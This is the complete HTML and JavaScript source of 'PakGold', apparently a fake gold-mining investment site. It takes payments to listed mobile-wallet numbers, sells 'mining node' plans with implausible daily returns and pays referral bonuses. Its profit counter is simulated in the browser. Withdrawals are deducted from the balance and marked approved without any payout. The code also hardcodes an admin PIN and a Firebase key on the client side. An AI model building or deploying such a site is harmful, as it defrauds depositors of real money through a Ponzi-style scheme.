<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PakGold | Official Mining Corp</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">

    <style>
        :root { --gold: #c5a059; --dark: #0f172a; --white: #ffffff; --vip: #ff4d4d; }
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Outfit',sans-serif; }
        body { background: #f1f5f9; color: var(--dark); }
        .page { display:none; min-height:100vh; padding-bottom:100px; }
        .page.active { display:block; }
        .card { background: var(--white); margin:12px; padding:18px; border-radius:20px; box-shadow:0 10px 25px rgba(0,0,0,0.05); }
        .btn-gold { background:var(--gold); color:white; border:none; padding:15px; border-radius:12px; width:100%; font-weight:700; cursor:pointer; }
        .node-card { border-left: 6px solid var(--gold); position:relative; overflow:hidden; }
        .vip-card { border-left: 6px solid var(--vip); background: #fff5f5; }
        .badge { position:absolute; top:0; right:0; padding:5px 12px; font-size:0.6rem; color:white; border-bottom-left-radius:12px; font-weight:800; }
        .nav { position:fixed; bottom:0; width:100%; background:white; display:flex; justify-content:space-around; padding:12px 0 25px; border-top:1px solid #eee; }
        input, select { width:100%; padding:14px; margin-bottom:12px; border-radius:10px; border:1px solid #ddd; }
    </style>
</head>
<body onload="init()">

    <!-- LOGIN -->
    <section id="login" class="page active">
        <div style="padding:60px 30px; text-align:center;">
            <h1 style="color:var(--gold); font-size:2.5rem;">PAK GOLD</h1>
            <p style="opacity:0.6; margin-bottom:40px;">Certified Real Mining Systems</p>
            <input type="number" id="ph" placeholder="Phone Number">
            <input type="password" id="pass" placeholder="Password">
            <input type="text" id="ref" placeholder="Referral ID">
            <button class="btn-gold" onclick="handleAuth()">START EARNING</button>
        </div>
    </section>

    <!-- DASHBOARD -->
    <section id="home" class="page">
        <div class="card" style="background:var(--dark); color:white; padding:30px;">
            <small>Total Assets</small>
            <h1 style="font-size:2.5rem; color:var(--gold);">Rs <span id="u_wallet">0</span></h1>
            <div style="display:flex; justify-content:space-between; margin-top:15px;">
                <span>Profit: <b id="u_profit">0</b></span>
                <span>Hash: <b id="u_speed">0</b></span>
            </div>
        </div>
        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; padding:0 12px;">
            <button class="btn-gold" onclick="nav('deposit')">DEPOSIT</button>
            <button class="btn-gold" style="background:#000;" onclick="nav('withdraw')">WITHDRAW</button>
        </div>
        <div id="nodes_container"></div>
    </section>

    <!-- DEPOSIT -->
    <section id="deposit" class="page">
        <div class="card">
            <h3>Add Funds</h3>
            <select id="d_meth" onchange="updNum()">
                <option value="J">JazzCash / SadaPay (03705519562)</option>
                <option value="E">EasyPaisa (03379827882)</option>
            </select>
            <input type="number" id="d_amt" placeholder="Amount">
            <input type="text" id="d_tid" placeholder="TID Number">
            <p>Upload Screenshot:</p>
            <input type="file" id="d_img">
            <button class="btn-gold" onclick="subDep()">SUBMIT DEPOSIT</button>
        </div>
    </section>

    <!-- WITHDRAW -->
    <section id="withdraw" class="page">
        <div class="card">
            <h3>Cashout</h3>
            <select id="w_meth">
                <option>EasyPaisa</option><option>JazzCash</option><option>SadaPay</option><option>Bank</option><option>Binance</option>
            </select>
            <input type="number" id="w_amt" placeholder="Amount">
            <input type="text" id="w_acc" placeholder="Account Details">
            <button class="btn-gold" onclick="subWd()">WITHDRAW NOW</button>
        </div>
    </section>

    <!-- ADMIN -->
    <section id="admin" class="page" style="background:#111; color:#0f0; padding:20px;">
        <h2>MASTER ADMIN</h2>
        <div id="adm_q"></div>
    </section>

    <nav class="nav" id="menu" style="display:none;">
        <div onclick="nav('home')"><i class="fa fa-home"></i><br>Home</div>
        <div onclick="nav('team')"><i class="fa fa-users"></i><br>Team</div>
        <div onclick="admCheck()"><i class="fa fa-lock"></i><br>Admin</div>
    </nav>

    <script>
        const fbConfig = { apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk", databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com" };
        firebase.initializeApp(fbConfig); const db = firebase.database();
        let user = localStorage.getItem('pg_real');

        function init() { if(user) { nav('home'); sync(); } loadPlans(); }

        function handleAuth() {
            let p = document.getElementById('ph').value;
            let r = document.getElementById('ref').value;
            if(p.length<10) return; user = p; localStorage.setItem('pg_real', p);
            db.ref('users/'+p).once('value', s => {
                if(!s.exists()) db.ref('users/'+p).set({wallet:0, profit:0, speed:0, inviter: r||'None'});
                location.reload();
            });
        }

        function loadPlans() {
            let cont = document.getElementById('nodes_container');
            const p = [
                {lvl:1, price:200, d:20, life:30, type:'REG'}, {lvl:2, price:500, d:55, life:30, type:'REG'},
                {lvl:3, price:1000, d:120, life:35, type:'REG'}, {lvl:4, price:2000, d:250, life:35, type:'REG'},
                {lvl:5, price:5000, d:650, life:40, type:'REG'}, {lvl:6, price:8000, d:1100, life:40, type:'REG'},
                {lvl:7, price:12000, d:1800, life:45, type:'REG'}, {lvl:8, price:15000, d:2400, life:45, type:'REG'},
                {lvl:9, price:20000, d:3500, life:50, type:'REG'}, {lvl:10, price:25000, d:4500, life:50, type:'REG'},
                {lvl:'VIP1', price:50000, d:10000, life:60, type:'VIP'}, {lvl:'VIP2', price:100000, d:22000, life:70, type:'VIP'},
                {lvl:'VIP3', price:200000, d:50000, life:80, type:'VIP'}, {lvl:'VIP4', price:350000, d:95000, life:90, type:'VIP'},
                {lvl:'VIP5', price:500000, d:150000, life:100, type:'VIP'}
            ];
            p.forEach(x => {
                let isV = x.type==='VIP';
                cont.innerHTML += `
                <div class="card node-card ${isV?'vip-card':''}">
                    <div class="badge" style="background:${isV?'#ff4d4d':'#c5a059'}">${x.type}</div>
                    <b>Level ${x.lvl} Node</b><br>
                    <small>Daily: Rs ${x.d} | Life: ${x.life} Days</small><br>
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px;">
                        <b style="color:var(--gold);">Rs ${x.price}</b>
                        <button onclick="buyPlan(${x.price}, ${x.d/86400})" style="padding:5px 15px; border-radius:8px; border:none; background:black; color:white;">Rent</button>
                    </div>
                </div>`;
            });
        }

        function sync() {
            db.ref('users/'+user).on('value', s => {
                document.getElementById('u_wallet').innerText = s.val().wallet;
                document.getElementById('u_profit').innerText = s.val().profit.toFixed(2);
                document.getElementById('u_speed').innerText = s.val().speed.toFixed(5);
            });
            setInterval(() => {
                db.ref('users/'+user).once('value', s => {
                    let d = s.val(); if(d.speed > 0) db.ref('users/'+user).update({profit: d.profit + d.speed});
                });
            }, 1000);
        }

        function buyPlan(p, s) {
            db.ref('users/'+user).once('value', v => {
                if(v.val().wallet < p) return alert("Low Balance!");
                db.ref('users/'+user).update({wallet: v.val().wallet - p, speed: v.val().speed + s});
                alert("Success!");
            });
        }

        function subDep() {
            let a = document.getElementById('d_amt').value;
            let t = document.getElementById('d_tid').value;
            db.ref('reqs').push({u:user, type:'Dep', amt:a, tid:t, st:'pending'});
            alert("Sent!"); nav('home');
        }

        function subWd() {
            let a = document.getElementById('w_amt').value;
            db.ref('users/'+user).once('value', s => {
                if(s.val().wallet < a) return alert("Low Balance!");
                db.ref('reqs').push({u:user, type:'Wd', amt:a, st:'pending'});
                db.ref('users/'+user).update({wallet: s.val().wallet - a});
                alert("Sent!"); nav('home');
            });
        }

        function admCheck() { if(prompt("PIN")==="pakgold786") { nav('admin'); loadAdm(); } }

        function loadAdm() {
            db.ref('reqs').on('value', s => {
                let q = document.getElementById('adm_q'); q.innerHTML = "";
                s.forEach(c => {
                    let r = c.val(); if(r.st==='pending') {
                        q.innerHTML += `<div style="border:1px solid #333; padding:10px; margin-top:5px;">
                        ${r.u} | ${r.type} | Rs ${r.amt} <br> TID: ${r.tid||'--'}
                        <button onclick="appr('${c.key}','${r.u}',${r.amt},'${r.type}')" style="color:white; background:green;">Approve</button></div>`;
                    }
                });
            });
        }

        function appr(id, u, a, t) {
            if(t==='Dep') {
                db.ref('users/'+u).once('value', s => {
                    db.ref('users/'+u).update({wallet: s.val().wallet + parseInt(a)});
                    let inv = s.val().inviter;
                    if(inv && inv !== 'None') {
                        db.ref('users/'+inv).once('value', si => {
                            db.ref('users/'+inv).update({wallet: si.val().wallet + (a*0.1)});
                        });
                    }
                });
            }
            db.ref('reqs/'+id).update({st:'done'}); alert("Approved!");
        }

        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('menu').style.display = (id==='login'||id==='admin') ? 'none' : 'flex';
        }
    </script>
</body>
</html>
